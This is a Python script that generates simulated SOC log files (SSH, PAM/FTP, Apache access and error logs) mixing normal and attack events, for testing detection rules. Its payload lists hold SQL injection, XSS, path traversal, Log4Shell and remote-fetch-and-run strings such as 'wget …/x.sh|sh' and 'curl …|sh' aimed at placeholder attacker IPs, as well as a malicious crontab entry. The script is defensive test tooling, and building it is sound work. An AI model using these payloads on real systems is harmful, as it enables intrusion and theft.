#!/usr/bin/env python3
"""
log_generator.py - live SOC log simulator
-----------------------------------------
Writes 4 log files at the same time (one thread each), randomly mixing
NORMAL traffic with realistic ATTACK traffic. Formats match your samples:

    auth.log          -> OpenSSH syslog   (Dec 10 06:55:46 LabSZ sshd[24200]: ...)
    linux.log         -> pam/ftpd/su/xinetd syslog (Jun 14 15:16:01 combo ...)
    access.log        -> Apache combined  (IP - - [date] "GET /x HTTP/1.1" 200 ...)
    apache_error.log  -> Apache error     ([Sun Dec 04 04:47:44 2005] [error] ...)

Run:    python log_generator.py
Stop:   Ctrl+C
Options:
    --dir logs        output folder (default: ./logs)
    --rate 1.0        speed multiplier (2.0 = twice as fast)
    --attack 0.30     share of events that are attacks, 0..1 (default 0.30)
    --append          append to existing files (default: truncate = fresh start)
    --seed 42         reproducible output

Pair with your collector: it tails these 4 files.
For authorised testing of your own detection pipeline only.
"""
import argparse
import os
import random
import threading
import time
from datetime import datetime

# ----------------------------------------------------------------------------
# shared helpers
# ----------------------------------------------------------------------------
LOCK = threading.Lock()
STOP = threading.Event()
R = random


def rip():
    """random public-looking IPv4"""
    while True:
        a = R.randint(1, 223)
        if a not in (10, 127, 172, 192, 169, 0):
            return f"{a}.{R.randint(0,255)}.{R.randint(1,254)}.{R.randint(1,254)}"


def now():
    return datetime.now()


def syslog_ts():
    n = now()
    return f"{n.strftime('%b')} {n.day:2d} {n.strftime('%H:%M:%S')}".replace("  ", " ") \
        if n.day >= 10 else f"{n.strftime('%b')}  {n.day} {n.strftime('%H:%M:%S')}"


def pid():
    return R.randint(1000, 32000)


# ----------------------------------------------------------------------------
# "attacker pool": a few persistent bad IPs so detection rules (N fails from
# same IP in X seconds) actually fire, plus a pool of regular users.
# ----------------------------------------------------------------------------
ATTACKERS = [rip() for _ in range(12)]
GOOD_IPS = [rip() for _ in range(25)]
CAMPAIGN = {"ip": None, "left": 0}   # a running brute-force burst


def attacker():
    return R.choice(ATTACKERS) if R.random() < 0.8 else rip()


def good_ip():
    return R.choice(GOOD_IPS)


COMMON_USERS = ["root", "admin", "test", "oracle", "ubuntu", "guest", "user",
                "postgres", "git", "ftp", "pi", "mysql", "support", "webmaster",
                "tomcat", "jenkins", "hadoop", "nagios", "ansible", "deploy"]
INVALID_POOL = None  # set below
REAL_USERS = ["alice", "bob", "carol", "dave", "deploy", "backup", "svc_app"]
FAKE_HOSTS = ["ns.marryaldkfaczcz.com", "static-{a}-{b}-{c}-{d}.ptr.example.net",
              "customer-{a}-{b}-{c}-{d}-sta.uninet-ide.com.mx",
              "{a}-{b}-{c}-{d}.dsl.in-addr.zen.co.uk", "vps{a}.hosting-cheap.ru",
              "host{a}.topspot.net", "ec2-{a}-{b}-{c}-{d}.compute-1.amazonaws.com"]


_HOSTS = {}


INVALID_POOL = [u for u in COMMON_USERS if u not in ("root", "deploy")]


def fake_host(ip):
    if ip not in _HOSTS:
        a, b, c, d = ip.split(".")
        _HOSTS[ip] = R.choice(FAKE_HOSTS).format(a=a, b=b, c=c, d=d)
    return _HOSTS[ip]


def pick(weighted):
    """weighted = [(weight, fn), ...] -> call a random fn"""
    total = sum(w for w, _ in weighted)
    r = R.uniform(0, total)
    up = 0
    for w, fn in weighted:
        up += w
        if r <= up:
            return fn()
    return weighted[-1][1]()


# ============================================================================
# 1) auth.log  (OpenSSH)         host = LabSZ
# ============================================================================
H1 = "LabSZ"


def a(line):
    return f"{syslog_ts()} {H1} sshd[{pid()}]: {line}"


def auth_normal():
    ip, u, p = good_ip(), R.choice(REAL_USERS), pid()
    port = R.randint(32768, 65535)
    t = syslog_ts()
    kind = R.choice(["pw", "key"])
    method = "password" if kind == "pw" else "publickey"
    return [
        f"{t} {H1} sshd[{p}]: Accepted {method} for {u} from {ip} port {port} ssh2",
        f"{t} {H1} sshd[{p}]: pam_unix(sshd:session): session opened for user {u} by (uid=0)",
        f"{t} {H1} sshd[{p}]: Received disconnect from {ip}: 11: disconnected by user",
        f"{t} {H1} sshd[{p}]: pam_unix(sshd:session): session closed for user {u}",
    ]


def auth_user_typo():
    ip, u = good_ip(), R.choice(REAL_USERS)
    p = pid()
    return [
        f"{syslog_ts()} {H1} sshd[{p}]: Failed password for {u} from {ip} port {R.randint(32768,65535)} ssh2",
        f"{syslog_ts()} {H1} sshd[{p}]: Accepted password for {u} from {ip} port {R.randint(32768,65535)} ssh2",
    ]


def auth_bruteforce_valid():
    """Category 1: existing user (root) password spraying"""
    ip = attacker()
    out = []
    for _ in range(R.randint(3, 9)):
        p = pid()
        port = R.randint(32768, 65535)
        out += [
            f"{syslog_ts()} {H1} sshd[{p}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user=root",
            f"{syslog_ts()} {H1} sshd[{p}]: Failed password for root from {ip} port {port} ssh2",
        ]
    out.append(f"{syslog_ts()} {H1} sshd[{pid()}]: error: Received disconnect from {ip}: 11: No more user authentication methods available. [preauth]")
    return out


def auth_bruteforce_invalid():
    """Category 2: non-existing usernames dictionary attack"""
    ip = attacker()
    out = []
    p = pid()
    out.append(f"{syslog_ts()} {H1} sshd[{p}]: reverse mapping checking getaddrinfo for {fake_host(ip)} [{ip}] failed - POSSIBLE BREAK-IN ATTEMPT!")
    for u in R.sample(INVALID_POOL, R.randint(2, 6)):
        p = pid()
        port = R.randint(32768, 65535)
        out += [
            f"{syslog_ts()} {H1} sshd[{p}]: Invalid user {u} from {ip}",
            f"{syslog_ts()} {H1} sshd[{p}]: input_userauth_request: invalid user {u} [preauth]",
            f"{syslog_ts()} {H1} sshd[{p}]: pam_unix(sshd:auth): check pass; user unknown",
            f"{syslog_ts()} {H1} sshd[{p}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}",
            f"{syslog_ts()} {H1} sshd[{p}]: Failed password for invalid user {u} from {ip} port {port} ssh2",
            f"{syslog_ts()} {H1} sshd[{p}]: Connection closed by {ip} [preauth]",
        ]
    return out


def auth_burst_campaign():
    """fast same-IP burst (the classic 'N fails in 60s' trigger)"""
    if not CAMPAIGN["left"]:
        CAMPAIGN["ip"], CAMPAIGN["left"] = attacker(), R.randint(8, 25)
    ip = CAMPAIGN["ip"]
    CAMPAIGN["left"] -= 1
    p = pid()
    u = R.choice(["root", "admin"])
    inv = "invalid user " if u == "admin" else ""
    return [f"{syslog_ts()} {H1} sshd[{p}]: Failed password for {inv}{u} from {ip} port {R.randint(32768,65535)} ssh2"]


def auth_scan_noid():
    ip = attacker()
    return [f"{syslog_ts()} {H1} sshd[{pid()}]: Did not receive identification string from {ip}",
            f"{syslog_ts()} {H1} sshd[{pid()}]: Bad protocol version identification '\\200\\0\\0' from {ip} port {R.randint(30000,60000)}"]


def auth_root_success_after_fail():
    """compromise indicator: brute force then success"""
    ip = attacker()
    p = pid()
    out = [f"{syslog_ts()} {H1} sshd[{p}]: Failed password for root from {ip} port {R.randint(32768,65535)} ssh2" for _ in range(4)]
    out += [f"{syslog_ts()} {H1} sshd[{p}]: Accepted password for root from {ip} port {R.randint(32768,65535)} ssh2",
            f"{syslog_ts()} {H1} sshd[{p}]: pam_unix(sshd:session): session opened for user root by (uid=0)"]
    return out


def auth_misc_attack():
    ip = attacker()
    return R.choice([
        [f"{syslog_ts()} {H1} sshd[{pid()}]: Received disconnect from {ip}: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]"],
        [f"{syslog_ts()} {H1} sshd[{pid()}]: Bad protocol version identification 'GET / HTTP/1.1' from {ip} port {R.randint(30000,60000)}"],
        [f"{syslog_ts()} {H1} sshd[{pid()}]: fatal: Unable to negotiate with {ip} port {R.randint(30000,60000)}: no matching key exchange method found. [preauth]"],
        [f"{syslog_ts()} {H1} sshd[{pid()}]: error: maximum authentication attempts exceeded for root from {ip} port {R.randint(30000,60000)} ssh2 [preauth]"],
        [f"{syslog_ts()} {H1} sshd[{pid()}]: Disconnecting: Too many authentication failures for root [preauth]"],
    ])


AUTH_NORMAL = [(6, auth_normal), (2, auth_user_typo)]
AUTH_ATTACK = [(4, auth_bruteforce_valid), (4, auth_bruteforce_invalid),
               (3, auth_burst_campaign), (2, auth_scan_noid),
               (1, auth_root_success_after_fail), (2, auth_misc_attack)]


# ============================================================================
# 2) linux.log  (pam / ftpd / su / xinetd / cron / sudo)   host = combo
# ============================================================================
H2 = "combo"


def l(proc, msg):
    return f"{syslog_ts()} {H2} {proc}[{pid()}]: {msg}"


def linux_normal():
    if R.random() < 0.06:                         # rare housekeeping noise
        return R.choice([
            [l("syslogd 1.4.1", "restart.")],
            [f"{syslog_ts()} {H2} kernel: eth0: link up, 100Mbps, full-duplex"],
            [l("logrotate", "ALERT exited abnormally with [1]")],
        ])
    u = R.choice(["news", "cyrus", "backup", "mail"])
    return R.choice([
        [l("su(pam_unix)", f"session opened for user {u} by (uid=0)"),
         l("su(pam_unix)", f"session closed for user {u}")],
        [l("cron(pam_unix)", "session opened for user root by (uid=0)"),
         l("cron(pam_unix)", "session closed for user root")],
        [l("ftpd", f"connection from {good_ip()} () at {now().strftime('%a %b %d %H:%M:%S %Y')}")],
        [l("sshd(pam_unix)", f"session opened for user {R.choice(REAL_USERS)} by (uid=0)")],
        [l("xinetd", f"START: sgi_fam pid={pid()} from=127.0.0.1")],
    ])


def linux_ssh_fail():
    ip = attacker()
    out = []
    for _ in range(R.randint(2, 6)):
        p = pid()
        usr = f"  user={R.choice(COMMON_USERS)}" if R.random() < 0.5 else " "
        if R.random() < 0.4:
            out.append(f"{syslog_ts()} {H2} sshd(pam_unix)[{p}]: check pass; user unknown")
        out.append(f"{syslog_ts()} {H2} sshd(pam_unix)[{p}]: authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost={ip}{usr}")
    return out


def linux_ftp_flood():
    ip = attacker()
    return [l("ftpd", f"connection from {ip} ({fake_host(ip)}) at {now().strftime('%a %b %d %H:%M:%S %Y')}")
            for _ in range(R.randint(5, 20))]


def linux_ftp_anon_bruteforce():
    ip = attacker()
    p = pid()
    return [f"{syslog_ts()} {H2} ftpd[{p}]: connection from {ip} ({fake_host(ip)}) at {now().strftime('%a %b %d %H:%M:%S %Y')}",
            f"{syslog_ts()} {H2} ftpd[{p}]: ANONYMOUS FTP LOGIN REFUSED FROM {ip} ({fake_host(ip)}), anonymous",
            f"{syslog_ts()} {H2} ftpd[{p}]: FTP LOGIN FAILED FROM {ip} ({fake_host(ip)}), {R.choice(COMMON_USERS)}"]


def linux_su_abuse():
    u = R.choice(REAL_USERS)
    return [l("su(pam_unix)", f"authentication failure; logname={u} uid=500 euid=0 tty=pts/1 ruser={u} rhost=  user=root"),
            l("su(pam_unix)", f"authentication failure; logname={u} uid=500 euid=0 tty=pts/1 ruser={u} rhost=  user=root"),
            f"{syslog_ts()} {H2} su: pam_authenticate: Authentication failure for root"]


def linux_privesc():
    u = R.choice(REAL_USERS)
    return R.choice([
        [f"{syslog_ts()} {H2} sudo:     {u} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/bin/bash"],
        [f"{syslog_ts()} {H2} sudo:     {u} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/su"],
        [f"{syslog_ts()} {H2} useradd[{pid()}]: new user: name=hax{R.randint(0,99)}, UID=0, GID=0, home=/root, shell=/bin/bash"],
        [f"{syslog_ts()} {H2} passwd[{pid()}]: pam_unix(passwd:chauthtok): password changed for root"],
        [f"{syslog_ts()} {H2} usermod[{pid()}]: add '{u}' to group 'wheel'"],
        [f"{syslog_ts()} {H2} crontab[{pid()}]: ({u}) REPLACE ({u})  # * * * * * curl http://{attacker()}/x.sh | sh"],
        [f"{syslog_ts()} {H2} kernel: audit: type=1400 avc: denied {{ execute }} for pid={pid()} comm=\"nc\" path=\"/tmp/.x/nc\""],
    ])


def linux_malware_kernel():
    return R.choice([
        [f"{syslog_ts()} {H2} kernel: possible SYN flooding on port 80. Sending cookies."],
        [f"{syslog_ts()} {H2} kernel: ip_conntrack: table full, dropping packet."],
        [f"{syslog_ts()} {H2} kernel: Out of Memory: Killed process {pid()} (httpd)."],
        [f"{syslog_ts()} {H2} kernel: martian source {rip()} from {rip()}, on dev eth0"],
        [f"{syslog_ts()} {H2} kernel: promiscuous mode enabled on device eth0"],     # sniffer
        [f"{syslog_ts()} {H2} xinetd[{pid()}]: FAIL: telnet address from={attacker()}"],
    ])


LINUX_NORMAL = [(1, linux_normal)]
LINUX_ATTACK = [(5, linux_ssh_fail), (3, linux_ftp_flood), (3, linux_ftp_anon_bruteforce),
                (2, linux_su_abuse), (2, linux_privesc), (2, linux_malware_kernel)]


# ============================================================================
# 3) access.log  (Apache combined)
# ============================================================================
UA_NORMAL = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25",
    "UniversalFeedParser/4.2-pre-314-svn +http://feedparser.org/",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
UA_BAD = ["sqlmap/1.7.2#stable (https://sqlmap.org)", "Nikto/2.1.6", "Nmap Scripting Engine; https://nmap.org/book/nse.html",
          "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "python-requests/2.28.1", "curl/7.58.0",
          "Hydra", "WPScan v3.8.22", "Mozilla/5.0 zgrab/0.x", "() { :; }; /bin/bash -c 'cat /etc/passwd'",
          "-", "dirbuster", "Acunetix-Aspect"]
NORMAL_PATHS = [
    "/", "/index.html", "/blog/", "/blog/tags/puppet?flav=rss20", "/about", "/contact",
    "/presentations/logstash-monitorama-2013/images/kibana-search.png",
    "/presentations/logstash-monitorama-2013/plugin/highlight/highlight.js",
    "/favicon.ico", "/robots.txt", "/css/main.css", "/js/app.js", "/images/logo.png",
    "/blog/geekery/installing-ossec.html", "/products?id=%d" % R.randint(1, 500), "/search?q=logstash",
    "/api/v1/status", "/downloads/report.pdf", "/login",
]
REFERERS = ["-", "http://semicomplete.com/blog/", "https://www.google.com/", "http://semicomplete.com/presentations/logstash-monitorama-2013/"]

SQLI = ["/products?id=1' OR '1'='1", "/products?id=1 UNION SELECT username,password FROM users--",
        "/login?user=admin'--&pass=x", "/item.php?id=1;DROP TABLE users", "/search?q=1' AND SLEEP(5)--",
        "/products?id=1 AND 1=CONVERT(int,(SELECT @@version))", "/news.php?id=-1 UNION ALL SELECT NULL,NULL,load_file('/etc/passwd')--"]
XSS = ["/search?q=<script>alert(1)</script>", "/comment?c=<img src=x onerror=alert(document.cookie)>",
       "/?name=<svg/onload=alert(1)>", "/redirect?u=javascript:alert(1)"]
TRAVERSAL = ["/../../../../etc/passwd", "/download?file=../../../../etc/shadow", "/static/..%2f..%2f..%2fetc/passwd",
             "/cgi-bin/..%252f..%252f..%252fbin/sh", "/?page=....//....//etc/passwd", "/windows/win.ini%00"]
RCE = ["/cgi-bin/test.cgi?cmd=;cat+/etc/passwd", "/index.php?cmd=wget+http://%s/x.sh+-O-|sh", "/?x=$(curl+http://%s/s|sh)",
       "/cgi-bin/bash", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/?a=${jndi:ldap://%s/a}",
       "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"]
SCAN_PATHS = ["/admin", "/administrator/index.php", "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/.env", "/.git/config",
              "/backup.zip", "/db.sql", "/config.php.bak", "/server-status", "/manager/html", "/xmlrpc.php",
              "/.aws/credentials", "/id_rsa", "/shell.php", "/c99.php", "/uploads/cmd.php", "/solr/admin/", "/actuator/env"]


def clf_ts():
    return now().strftime("%d/%b/%Y:%H:%M:%S +0530")


def acc(ip, method, path, status, size, ref="-", ua=None, proto="HTTP/1.1"):
    ua = ua or R.choice(UA_NORMAL)
    return f'{ip} - - [{clf_ts()}] "{method} {path} {proto}" {status} {size} "{ref}" "{ua}"'


def access_normal():
    ip = good_ip()
    p = R.choice(NORMAL_PATHS)
    st = R.choices([200, 304, 301, 404, 206], [78, 10, 4, 6, 2])[0]
    return [acc(ip, "GET", p, st, R.randint(200, 300000) if st == 200 else R.randint(0, 600), R.choice(REFERERS))]


def access_sqli():
    ip = attacker()
    return [acc(ip, "GET", R.choice(SQLI), R.choice([200, 500, 403, 404]), R.randint(150, 9000), ua=R.choice(UA_BAD[:1] + UA_NORMAL))]


def access_xss():
    return [acc(attacker(), R.choice(["GET", "POST"]), R.choice(XSS), R.choice([200, 400, 403]), R.randint(150, 5000))]


def access_traversal():
    return [acc(attacker(), "GET", R.choice(TRAVERSAL), R.choice([400, 403, 404, 200]), R.randint(150, 2500), ua=R.choice(UA_BAD))]


def access_rce():
    p = R.choice(RCE)
    p = p % attacker() if "%s" in p else p
    return [acc(attacker(), R.choice(["GET", "POST"]), p, R.choice([400, 404, 500, 200]), R.randint(100, 3000), ua=R.choice(UA_BAD))]


def access_scan():
    ip, ua = attacker(), R.choice(UA_BAD)
    return [acc(ip, "GET", R.choice(SCAN_PATHS), R.choices([404, 403, 200, 401], [70, 15, 5, 10])[0], R.randint(150, 800), ua=ua)
            for _ in range(R.randint(4, 14))]


def access_dos():
    ip = attacker()
    p = R.choice(NORMAL_PATHS)
    return [acc(ip, "GET", p, R.choice([200, 503, 200]), R.randint(500, 20000), ua=R.choice(UA_BAD[4:6])) for _ in range(R.randint(15, 40))]


def access_login_bruteforce():
    ip = attacker()
    return [acc(ip, "POST", R.choice(["/login", "/wp-login.php", "/admin/login", "/xmlrpc.php"]),
                R.choices([401, 403, 200, 302], [75, 10, 5, 10])[0], R.randint(200, 1500), ua=R.choice(UA_BAD[4:7]))
            for _ in range(R.randint(6, 20))]


def access_webshell():
    ip = attacker()
    return [acc(ip, "POST", R.choice(["/uploads/shell.php", "/images/c99.php", "/wp-content/uploads/x.php?cmd=id"]),
                200, R.randint(50, 4000), ua=R.choice(UA_BAD)),
            acc(ip, "GET", "/uploads/shell.php?cmd=whoami", 200, 9)]


def access_methods():
    return [acc(attacker(), R.choice(["TRACE", "PUT", "DELETE", "CONNECT", "PROPFIND", "OPTIONS"]),
                R.choice(["/", "/shell.txt", "/admin/", "evil.com:443"]), R.choice([405, 501, 403, 200]), R.randint(0, 500), ua=R.choice(UA_BAD))]


ACCESS_NORMAL = [(1, access_normal)]
ACCESS_ATTACK = [(4, access_sqli), (2, access_xss), (3, access_traversal), (3, access_rce),
                 (4, access_scan), (2, access_dos), (3, access_login_bruteforce),
                 (1, access_webshell), (1, access_methods)]


# ============================================================================
# 4) apache_error.log
# ============================================================================
def err_ts():
    return now().strftime("%a %b %d %H:%M:%S %Y")


def e(level, msg, client=None):
    c = f"[client {client}] " if client else ""
    return f"[{err_ts()}] [{level}] {c}{msg}"


def error_normal():
    if R.random() < 0.05:                         # restarts are rare in real life
        return R.choice([
            [e("notice", "Graceful restart requested, doing restart")],
            [e("notice", "Apache/2.2.3 (CentOS) configured -- resuming normal operations")],
            [e("warn", f"mod_jk child workerEnv in error state {R.randint(1,8)}")],
        ])
    return R.choice([
        [e("notice", f"jk2_init() Found child {R.randint(1000,9999)} in scoreboard slot {R.randint(1,20)}")],
        [e("notice", "workerEnv.init() ok /etc/httpd/conf/workers2.properties")],
    ])


def error_dirindex():
    return [e("error", "Directory index forbidden by rule: /var/www/html/", attacker())]


def error_not_found():
    p = R.choice(SCAN_PATHS)
    return [e("error", f"File does not exist: /var/www/html{p.split('?')[0]}", attacker())
            for _ in range(R.randint(1, 5))]


def error_attack_blocked():
    ip = attacker()
    return R.choice([
        [e("error", f"ModSecurity: Access denied with code 403 (phase 2). Pattern match \"(?i:union.*select)\" at ARGS:id. [id \"950001\"] [msg \"SQL Injection Attack\"]", ip)],
        [e("error", f"ModSecurity: Warning. Pattern match \"<script\" at ARGS:q. [id \"973300\"] [msg \"XSS Attack Detected\"]", ip)],
        [e("error", f"Invalid URI in request GET /../../../../etc/passwd HTTP/1.1", ip)],
        [e("error", "request failed: URI too long (longer than 8190)", ip)],
        [e("error", "Invalid method in request \\x16\\x03\\x01", ip)],
        [e("error", f"script not found or unable to stat: /var/www/cgi-bin/{R.choice(['php','bash','test.cgi','phpmyadmin'])}", ip)],
        [e("error", "client sent HTTP/1.1 request without hostname (see RFC2616 section 14.23): /", ip)],
        [e("error", f"user admin: authentication failure for \"/admin/\": Password Mismatch", ip)],
        [e("error", f"user {R.choice(COMMON_USERS)} not found: /manager/html", ip)],
    ])


def error_dos_stress():
    return R.choice([
        [e("error", "server reached MaxClients setting, consider raising the MaxClients setting")],
        [e("error", f"(11)Resource temporarily unavailable: couldn't create child process: /usr/sbin/suexec")],
        [e("error", f"mod_jk child init {R.randint(1,3)} -{R.randint(1,2)}")],
        [e("error", f"jk2_init() Can't find child {R.randint(1000,9999)} in scoreboard")],
        [e("emerg", f"(12)Cannot allocate memory: fork: Unable to fork new process")],
        [e("error", f"mod_jk child workerEnv in error state {R.randint(5,9)}")] * R.randint(1, 3),
    ])


def error_php():
    return [e("error", f"PHP Warning:  include({R.choice(['../../etc/passwd','http://'+attacker()+'/s.txt'])}): failed to open stream in /var/www/html/index.php on line {R.randint(5,200)}", attacker()),
            e("error", f"PHP Fatal error:  Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064' in /var/www/html/db.php:{R.randint(5,90)}", attacker())][: R.randint(1, 2)]


ERROR_NORMAL = [(1, error_normal)]
ERROR_ATTACK = [(3, error_dirindex), (4, error_not_found), (4, error_attack_blocked),
                (2, error_dos_stress), (2, error_php)]


# ============================================================================
# engine
# ============================================================================
SOURCES = {
    "auth.log":         (AUTH_NORMAL,   AUTH_ATTACK,   (0.4, 2.0)),
    "linux.log":        (LINUX_NORMAL,  LINUX_ATTACK,  (0.6, 2.5)),
    "access.log":       (ACCESS_NORMAL, ACCESS_ATTACK, (0.1, 0.8)),
    "apache_error.log": (ERROR_NORMAL,  ERROR_ATTACK,  (0.8, 3.0)),
}


def writer(path, normal, attack, delay, rate, attack_ratio):
    lo, hi = delay
    with open(path, "a", encoding="utf-8", buffering=1) as f:
        while not STOP.is_set():
            lines = pick(attack) if R.random() < attack_ratio else pick(normal)
            with LOCK:
                pass  # file is private per-thread; lock kept for console printing only
            for ln in lines:
                f.write(ln + "\n")
                f.flush()
                if len(lines) > 1:                       # bursts arrive fast, like real attacks
                    time.sleep(R.uniform(0.01, 0.12) / rate)
            STOP.wait(R.uniform(lo, hi) / rate)


def main():
    ap = argparse.ArgumentParser(description="Live SOC log generator (4 files, simultaneous)")
    ap.add_argument("--dir", default="logs")
    ap.add_argument("--rate", type=float, default=1.0)
    ap.add_argument("--attack", type=float, default=0.30)
    ap.add_argument("--append", action="store_true")
    ap.add_argument("--seed", type=int)
    ap.add_argument("--keep", action="store_true", help="do NOT empty the files on exit")
    args = ap.parse_args()
    if args.seed is not None:
        R.seed(args.seed)

    os.makedirs(args.dir, exist_ok=True)
    threads, paths = [], []
    for name, (norm, atk, delay) in SOURCES.items():
        path = os.path.join(args.dir, name)
        if not args.append:
            open(path, "w").close()
        t = threading.Thread(target=writer, args=(path, norm, atk, delay, args.rate, args.attack), daemon=True)
        t.start()
        threads.append(t)
        paths.append(path)
        print(f"[+] writing  {path}")
    print(f"[*] attack ratio {args.attack:.0%}, rate x{args.rate}  -  Ctrl+C to stop")

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        STOP.set()
        for t in threads:                 # let writers close their files first
            t.join(timeout=3)
        if not args.keep:
            for pth in paths:
                open(pth, "w").close()    # truncate -> files are empty
            print("\n[*] stopped - log files emptied")
        else:
            print("\n[*] stopped - log files kept")


if __name__ == "__main__":
    main()